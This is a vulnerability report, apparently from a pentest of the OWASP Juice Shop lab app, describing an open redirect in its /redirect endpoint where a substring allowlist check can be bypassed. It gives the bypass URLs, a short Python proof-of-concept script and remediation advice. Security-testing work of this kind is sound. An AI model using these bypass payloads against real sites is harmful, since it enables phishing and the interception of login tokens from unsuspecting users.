╭─ VULN-0008 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Open Redirect in /redirect via Allowlist Bypass Enables Redirect to  │
│  Arbitrary External Domains                                                  │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.4                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /redirect                                                         │
│                                                                              │
│  Method: GET                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N                            │
│                                                                              │
│  Description                                                                 │
│  An open redirect vulnerability was identified in the application's          │
│  redirector endpoint. While the endpoint appears to implement an allowlist   │
│  (blocking direct redirects to non-approved domains), the allowlist          │
│  enforcement can be bypassed by embedding an allowlisted URL as a substring  │
│  within an attacker-controlled external URL. This results in the server      │
│  responding with an HTTP redirect to an arbitrary external domain.           │
│                                                                              │
│  Impact                                                                      │
│  An attacker can craft trusted-looking links on the application’s domain     │
│  that redirect victims to attacker-controlled sites, enabling phishing and   │
│  social engineering campaigns. If this redirector is ever used in            │
│  OAuth/OIDC flows, email links, or other security-sensitive workflows, it    │
│  can facilitate token/code interception and account compromise. It may also  │
│  be used to bypass URL allowlists in downstream systems that treat this      │
│  domain as trusted.                                                          │
│                                                                              │
│  Technical Analysis                                                          │
│  The /redirect endpoint takes a user-controlled destination parameter (to)   │
│  and issues a server-side HTTP redirect. Testing indicates the               │
│  implementation likely validates the destination using a weak allowlist      │
│  check (e.g., substring/contains matching against allowlisted URLs) rather   │
│  than strict validation of the parsed URL origin (scheme, hostname, and      │
│  port) after normalization.                                                  │
│                                                                              │
│  Evidence shows direct redirects to an external domain are blocked (HTTP     │
│  406), but redirects become allowed when the attacker’s external URL         │
│  includes an allowlisted URL within its query string or path. The server     │
│  then issues an HTTP 302 with a Location header pointing to the              │
│  attacker-controlled external destination, demonstrating an allowlist        │
│  bypass.                                                                     │
│                                                                              │
│  Evidence (proxy request IDs):                                               │
│  The baseline block behavior is captured in request_id 3134 (406 when        │
│  to=https://example.com/).                                                   │
│  The bypass behavior is captured in request_id 3169 (302 with Location:      │
│  https://example.com/?next=https://github.com/juice-shop/juice-shop) and     │
│  request_id 3177 (302 with Location:                                         │
│  https://example.com/https://github.com/juice-shop/juice-shop).              │
│                                                                              │
│  PoC Description                                                             │
│  1. Send a request that should be blocked by the allowlist:                  │
│  GET http://juiceshop:3000/redirect?to=https://example.com/                  │
│  Expected result: HTTP 406 (blocked). Evidence: request_id 3134.             │
│                                                                              │
│  2. Send a bypass request where an allowlisted URL is embedded as a          │
│  substring within an attacker-controlled URL:                                │
│  GET                                                                         │
│  http://juiceshop:3000/redirect?to=https://example.com/?next=https://github  │
│  .com/juice-shop/juice-shop                                                  │
│  Expected result: HTTP 302 with Location header pointing to                  │
│  https://example.com/?next=https://github.com/juice-shop/juice-shop          │
│  (external domain). Evidence: request_id 3169.                               │
│                                                                              │
│  3. Optional alternate bypass:                                               │
│  GET                                                                         │
│  http://juiceshop:3000/redirect?to=https://example.com/https://github.com/j  │
│  uice-shop/juice-shop                                                        │
│  Expected result: HTTP 302 redirect to                                       │
│  https://example.com/https://github.com/juice-shop/juice-shop. Evidence:     │
│  request_id 3177.                                                            │
│                                                                              │
│  PoC Code                                                                    │
│  import sys                                                                  │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│                                                                              │
│  def check(url: str) -> None:                                                │
│      r = requests.get(url, allow_redirects=False, timeout=15)                │
│      print(f"URL: {url}")                                                    │
│      print(f"Status: {r.status_code}")                                       │
│      print(f"Location: {r.headers.get('Location', '')}")                     │
│      print("-" * 60)                                                         │
│                                                                              │
│  def main() -> int:                                                          │
│      blocked = f"{BASE}/redirect?to=https://example.com/"                    │
│      bypass =                                                                │
│  f"{BASE}/redirect?to=https://example.com/?next=https://github.com/juice-sh  │
│  op/juice-shop"                                                              │
│      bypass2 =                                                               │
│  f"{BASE}/redirect?to=https://example.com/https://github.com/juice-shop/jui  │
│  ce-shop"                                                                    │
│                                                                              │
│      check(blocked)                                                          │
│      check(bypass)                                                           │
│      check(bypass2)                                                          │
│      return 0                                                                │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      raise SystemExit(main())                                                │
│                                                                              │
│  Remediation                                                                 │
│  Implement strict redirect destination validation:                           │
│  Use a single canonical URL parser and validate the final destination by     │
│  comparing the normalized scheme, hostname, and port against an explicit     │
│  allowlist of approved origins.                                              │
│  Reject protocol-relative URLs and ambiguous/encoded forms that can alter    │
│  parsing outcomes.                                                           │
│  Do not use substring/prefix/suffix matching for allowlist decisions.        │
│  If redirects are only intended to be internal, restrict to relative paths   │
│  and enforce same-origin navigation.                                         │
│  For defense in depth, consider showing an interstitial warning page that    │
│  displays the final destination before navigating off-site, and add          │
│  security monitoring for unusual redirect destinations.                      │
│                                                                              │
